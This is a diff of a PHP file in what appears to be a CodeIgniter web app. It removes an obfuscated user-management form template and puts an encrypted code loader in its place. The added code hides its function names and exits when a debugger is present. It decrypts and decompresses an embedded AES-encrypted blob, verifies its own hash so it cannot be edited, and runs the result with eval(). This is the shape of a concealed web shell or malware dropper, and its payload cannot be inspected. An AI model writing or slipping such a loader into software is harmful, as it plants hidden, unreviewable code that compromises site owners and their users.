@@ -1,48 +1,28 @@
 <?php
- goto Vjcwk; Xhvr3: echo $disabled; goto noRCb; nXLeO: ?>
-</a></li><li class="active"><?php  goto pVRby; TGrZ6: ?>
-</select> <span class="text-danger"id="cash_id_msg"style="display:none"></span></div></div><div class="form-group"><label class="col-sm-4 control-label"for="pass"><?php  goto R8M80; d1eAQ: echo form_open("\43", array("\x63\x6c\x61\163\x73" => "\146\157\x72\155\x2d\x68\x6f\162\x69\172\157\156\164\141\x6c", "\x69\144" => "\165\x73\145\162\163\55\146\157\x72\x6d", "\x65\156\x63\x74\171\x70\x65" => "\155\x75\x6c\x74\151\160\141\x72\164\x2f\x66\x6f\162\155\55\x64\x61\164\x61", "\x6d\145\x74\x68\157\144" => "\x50\117\x53\x54")); goto Xe7DN; R29Kw: ?>
-<label class="text-danger">*</label></label><div class="col-sm-8"><select class="form-control"id="role_id"name="role_id"style="width:100%"<?php  goto Xhvr3; KpCTB: echo $base_url; goto qLuwH; ckYFU: ?>
-</div></div><div class="col-md-6"><div class="form-group"><div class="col-sm-8 col-sm-offset-4"><img class="img-responsive"height="200px"src="<?php  goto fW0Eo; JxIHi: include "\x63\157\x6d\x6d\141\156\x2f\143\157\144\x65\x5f\x6a\163\137\163\157\x75\156\x64\56\160\x68\160"; goto cQP56; IR8Y2: echo $this->lang->line("\162\x6f\154\145"); goto R29Kw; WYClm: echo form_close(); goto Lz0t7; aIKBv: include "\143\x6f\x6d\x6d\141\x6e\57\x63\157\144\145\137\143\163\163\137\x66\157\x72\155\56\160\150\160"; goto VNS6S; d64y1: if (empty($q_id)) { ?>
-<label class="text-danger">*</label><?php  } goto AKpng; wKIlA: echo $this->lang->line("\155\x6f\x62\x69\154\x65"); goto sByf4; aBeON: ?>
-<div class="content-wrapper"><section class="content-header"><h1><?php  goto j_D0i; infe4: $q2 = $this->db->select("\x2a")->where("\x73\x74\141\164\165\x73", 1)->get("\x64\x62\137\143\x61\163\150"); goto zvd1p; BQTiL: echo basename(__FILE__, "\x2e\x70\150\160"); goto ms1Tw; uthdk: print $disabled; goto j_P22; hLwXS: if (empty($q_id)) { ?>
-<label class="text-danger">*</label><?php  } goto Rlojc; MVB_A: ?>
-><?php  goto infe4; sByf4: ?>
-<label class="text-danger">*</label></label><div class="col-sm-8"><input id="mobile"name="mobile"class="form-control input-sm no_special_char_no_space"placeholder=""onkeyup='shift_cursor(event,"email")'value="<?php  goto NvWB6; fW0Eo: echo base_url($profile_picture); goto aL5pY; CAk8V: ?>
-"><?php  goto lp2dC; p2IoT: include "\x73\x69\144\145\x62\141\162\56\160\x68\x70"; goto VDo0y; VsFBx: echo $base_url; goto IXrl1; ZGYAb: ?>
-</button></div><div class="col-sm-3"><a href="<?php  goto CHzrj; Ejf1i: echo $this->lang->line("\165\x73\x65\162\x5f\x6e\x61\155\x65"); goto RhFvi; fObvI: ?>
-"style="<?php  goto MKBep; j_D0i: echo $page_title; goto vLxse; v12mj: ?>
-<div class="col-md-12"><div class="box box-info"><?php  goto d1eAQ; jN9OM: ?>
-<div class="control-sidebar-bg"></div></div><?php  goto JxIHi; OPswZ: echo $btn_id; goto fObvI; Jnime: echo $this->lang->line("\x65\155\x61\151\154"); goto gXoDN; Tuoyh: ?>
-<input id="q_id"name="q_id"type="hidden"value="<?php  goto S7_F1; VppJ3: if ($role_id != 1) { $this->db->where("\151\x64\41\x3d\61"); } goto zPLdk; qEchv: echo $base_url; goto cWLIs; VDo0y: if (!isset($username)) { $username = $mobile = $email = $q_id = $role_id = $cash_id = ''; $disabled = ''; $profile_picture = ''; $command = "\163\x61\x76\145"; } else { $disabled = "\144\151\x73\x61\x62\x6c\x65\144\x3d\42\x64\151\x73\141\142\154\x65\x64\42"; $command = "\x75\x70\x64\141\x74\145"; } goto FXEOl; Rlojc: ?>
-</label><div class="col-sm-8"><input id="pass"name="pass"class="form-control input-sm"placeholder=""onkeyup='shift_cursor(event,"confirm")'type="password"<?php  goto uthdk; RhFvi: ?>
-<label class="text-danger">*</label></label><div class="col-sm-8"><input id="new_user"name="new_user"class="form-control input-sm"placeholder=""onkeyup='shift_cursor(event,"mobile")'value="<?php  goto fzOKY; qMZ4A: ?>
-js/users.js"></script><script>$(".<?php  goto BQTiL; Zw0Pz: if (up_load()) { ?>
-<label class="col-sm-4 control-label"for="address"><?php  echo $this->lang->line("\160\x72\x6f\x66\x69\154\x65\x5f\160\x69\x63\x74\x75\x72\145"); ?>
-</label><div class="col-sm-8"><input id="profile_picture"name="profile_picture"type="file"> <span class="text-danger"id="logo_msg"style="display:block">Max Width/Height: 5000px * 5000px & Size: 5024kb</span></div><?php  } goto ckYFU; mnW1e: if (demo_app()) { $style_button = "\144\151\x73\160\x6c\x61\171\72\x6e\x6f\x6e\145\x3b"; } else { $style_button = "\x64\151\163\x70\154\x61\171\x3b"; } goto Tuoyh; FXEOl: if (empty($profile_picture)) { $profile_picture = "\x74\150\x65\x6d\x65\57\144\151\163\x74\57\x69\155\x67\57\141\x76\141\x74\x61\x72\x35\x2e\160\156\147"; } goto EA3Sz; EA3Sz: $disabled = $q_id == 1 ? "\x64\x69\163\141\142\154\x65\x64" : ''; goto aBeON; Xe7DN: ?>
-<input id="base_url"type="hidden"value="<?php  goto VsFBx; cQP56: include "\143\x6f\x6d\155\x61\x6e\x2f\143\157\144\145\x5f\152\x73\137\146\157\162\155\56\160\150\x70"; goto Sdkg0; wrt01: ?>
-"><button class="btn btn-block btn-warning close_btn col-sm-3"title="Go Dashboard"type="button">Close</button></a></div></div></div><?php  goto WYClm; aL5pY: ?>
-"style="border:3px solid #d2d6de"width="200px"></div></div></div></div></div><div class="box-footer"><div class="col-sm-8 col-sm-offset-2 text-center"><?php  goto OIKAB; lp2dC: echo $btn_name; goto ZGYAb; NARk5: echo $this->lang->line("\x63\x6f\x6e\146\151\x72\x6d\137\x70\x61\163\x73\167\x6f\x72\x64"); goto d64y1; MKBep: echo $style_button; goto CAk8V; cWLIs: ?>
-users/view"><?php  goto LSPE_; OIKAB: if ($username != '') { $btn_name = "\125\x70\x64\x61\164\145"; $btn_id = "\x75\160\144\141\x74\x65"; } else { $btn_name = "\123\141\166\145"; $btn_id = "\163\x61\x76\145"; } goto mnW1e; jJVSJ: ?>
-"> <span class="text-danger"id="mobile_msg"style="display:none"></span></div></div><div class="form-group"><label class="col-sm-4 control-label"for="email"><?php  goto Jnime; vLxse: ?>
-<small>Enter User Information</small></h1><ol class="breadcrumb"><li><a href="<?php  goto KpCTB; uD9HE: ?>
-"><div class="col-md-3 col-md-offset-3"><button class="btn btn-block btn-success"title="Save Data"type="button"id="<?php  goto OPswZ; c7f4L: ?>
-"> <span class="text-danger"id="email_msg"style="display:none"></span></div></div><div class="form-group"><label class="col-sm-4 control-label"for="role_id"><?php  goto IR8Y2; Sdkg0: ?>
-<script src="<?php  goto wuPD2; QEQhQ: include "\146\157\x6f\x74\x65\162\x2e\x70\150\x70"; goto jN9OM; gXoDN: ?>
-<label class="text-danger">*</label></label><div class="col-sm-8"><input id="email"name="email"class="form-control input-sm"placeholder=""onkeyup='shift_cursor(event,"pass")'value="<?php  goto ybJqZ; noRCb: ?>
-><?php  goto VppJ3; NvWB6: print $mobile; goto jJVSJ; wuPD2: echo $theme_link; goto qMZ4A; AKpng: ?>
-</label><div class="col-sm-8"><input id="confirm"name="confirm"class="form-control input-sm"placeholder=""type="password"<?php  goto hh8jL; ZTrHE: ?>
-</li></ol></section><section class="content"><div class="row"><?php  goto fhxqI; gnvCY: ?>
-"><div class="box-body"><div class="row"><div class="col-md-6"><div class="form-group"><label class="col-sm-4 control-label"for="new_user"><?php  goto Ejf1i; zvd1p: if ($q2->num_rows() > 0) { echo "\74\x6f\160\x74\151\x6f\x6e\x20\166\x61\154\x75\145\x3d\47\x27\76\55\x53\145\154\145\x63\x74\x2d\74\57\x6f\x70\x74\x69\157\x6e\x3e"; foreach ($q2->result() as $res1) { if (isset($cash_id) && !empty($cash_id) && $cash_id == $res1->id) { $selected = "\163\x65\x6c\x65\x63\x74\145\144"; } else { $selected = ''; } echo "\74\x6f\x70\x74\x69\x6f\156\x20" . $selected . "\40\166\141\154\x75\145\75\x27" . $res1->id . "\47\76" . $res1->cash_name . "\74\57\x6f\x70\164\151\x6f\x6e\76"; } } else { ?>
-<option value="">No Records Found</option><?php  } goto TGrZ6; m3S0x: ?>
-> <span class="text-danger"id="confirm_msg"style="display:none"></span></div></div></div><div class="col-md-6"><div class="form-group"><?php  goto Zw0Pz; OYN9E: echo $command; goto gnvCY; l0z5C: ?>
-</select> <span class="text-danger"id="role_id_msg"style="display:none"></span></div></div><div class="form-group"><label class="col-sm-4 control-label"for="cash_id">Két tiền <label class="text-danger">*</label></label><div class="col-sm-8"><select class="form-control"id="cash_id"name="cash_id"style="width:100%"<?php  goto MiCHV; fzOKY: print $username; goto QAleE; CHzrj: echo base_url("\144\141\x73\x68\x62\x6f\141\x72\144"); goto wrt01; R8M80: echo $this->lang->line("\x70\141\163\163\x77\157\x72\x64"); goto hLwXS; IXrl1: ?>
-"> <input name="command"type="hidden"value="<?php  goto OYN9E; S7_F1: echo $q_id; goto uD9HE; qLuwH: ?>
-dashboard"><i class="fa fa-dashboard"></i> Home</a></li><li><a href="<?php  goto qEchv; QAleE: ?>
-"autofocus> <span class="text-danger"id="new_user_msg"style="display:none"></span></div></div><div class="form-group"><label class="col-sm-4 control-label"for="mobile"><?php  goto wKIlA; fhxqI: include "\143\157\x6d\155\141\x6e\57\x63\157\x64\145\x5f\146\154\141\x73\150\x64\x61\x74\x61\x2e\x70\x68\x70"; goto v12mj; pVRby: echo $page_title; goto ZTrHE; ni590: if ($q2->num_rows() > 0) { echo "\x3c\x6f\160\164\151\x6f\156\40\x76\x61\x6c\165\x65\x3d\47\47\x3e\x2d\123\x65\x6c\145\x63\x74\x2d\74\57\x6f\x70\x74\x69\157\x6e\x3e"; foreach ($q2->result() as $res1) { if (isset($role_id) && !empty($role_id) && $role_id == $res1->id) { $selected = "\163\x65\x6c\x65\143\x74\x65\x64"; } else { $selected = ''; } echo "\74\157\x70\164\151\x6f\x6e\40" . $selected . "\40\x76\141\154\165\145\75\47" . $res1->id . "\47\76" . $res1->role_name . "\x3c\x2f\x6f\160\x74\x69\x6f\156\x3e"; } } else { ?>
-<option value="">No Records Found</option><?php  } goto l0z5C; LSPE_: echo $this->lang->line("\x76\151\x65\167\x5f\165\163\145\x72\x73"); goto nXLeO; hh8jL: print $disabled; goto m3S0x; zPLdk: $q2 = $this->db->select("\52")->where("\x73\164\141\164\165\x73", 1)->get("\x64\x62\137\162\157\154\145\163"); goto ni590; ybJqZ: print $email; goto c7f4L; j_P22: ?>
-> <span class="text-danger"id="pass_msg"style="display:none"></span></div></div><div class="form-group"><label class="col-sm-4 control-label"for="confirm"><?php  goto NARk5; VNS6S: ?>
-</head><body class="hold-transition sidebar-mini skin-blue"><div class="wrapper"><?php  goto p2IoT; MiCHV: echo $disabled; goto MVB_A; Vjcwk: ?>
-<!doctypehtml><html><head><?php  goto aIKBv; Lz0t7: ?>
-</div></div></div></section></div><?php  goto QEQhQ; ms1Tw: ?>
--active-li").addClass("active")</script></body></html>
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_cyll3pwq=('bas'.'e64'.'_de'.'cod'.'e');
+$_bqttjp8y=('gzu'.'nco'.'mpr'.'ess');
+$_e8imj3kh=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_vln2if9j='G/lcedov';
+$_c7xm1fap='RGUmi7Ld';
+$_cin8cg9k='9jm7fZWV';
+$_mrsj4lsi='mzh08BVB';
+$_ensqydzk='JBFFn0d0ifE=';
+$_mo8cwhas='zbnEITE1';
+$_luckwbbh='XWPS39gn';
+$_w7hvsdif='ReyugA==';
+$_grcj1t6k=$_cyll3pwq($_vln2if9j.$_mrsj4lsi.$_c7xm1fap.$_cin8cg9k.$_ensqydzk);
+$_bncslxqo=$_cyll3pwq($_mo8cwhas.$_luckwbbh.$_w7hvsdif);
+$_zj2me2j3=$_cyll3pwq('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');
+$_klk06nhv=$_e8imj3kh($_zj2me2j3,'aes-256-cbc',$_grcj1t6k,OPENSSL_RAW_DATA,$_bncslxqo);
+if($_klk06nhv===false){exit;}
+$_lithp49g=$_bqttjp8y($_klk06nhv);
+if($_lithp49g===false){exit;}
+$_qodgiy82='5a001366c1612de6ef5cd6b44fd7bbfb8e232040767937cbbb84b4578df5a4d8';
+$_y7iiuit7=@file_get_contents(__FILE__);
+if($_y7iiuit7!==false){
+$_bcvsuj5z=str_replace($_qodgiy82,"0000000000000000000000000000000000000000000000000000000000000000",$_y7iiuit7);
+$_qqrsfvma=hash("sha256",$_bcvsuj5z);
+if($_qqrsfvma!==$_qodgiy82){@http_response_code(403);exit;}
+}
+eval($_lithp49g);
